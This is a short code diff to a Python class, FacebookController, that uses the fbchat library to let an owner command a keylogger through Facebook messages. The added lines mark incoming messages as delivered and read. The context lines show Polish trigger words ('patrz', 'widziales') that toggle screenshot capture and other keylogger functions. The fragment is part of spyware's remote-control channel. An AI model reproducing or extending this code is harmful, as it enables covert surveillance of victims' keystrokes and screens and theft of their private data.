@@ -24,6 +24,9 @@ class FacebookController(fbchat.Client):
         self.send(self.owner_uid, message)
 
     def on_message(self, mid, author_id, author_name, message, metadata):
+        self.markAsDelivered(author_id, mid)
+        self.markAsRead(author_id)
+
         if 'patrz' in message:
             self.keylogger.toggle_screenshots_capturing()
         if 'widziales' in message:
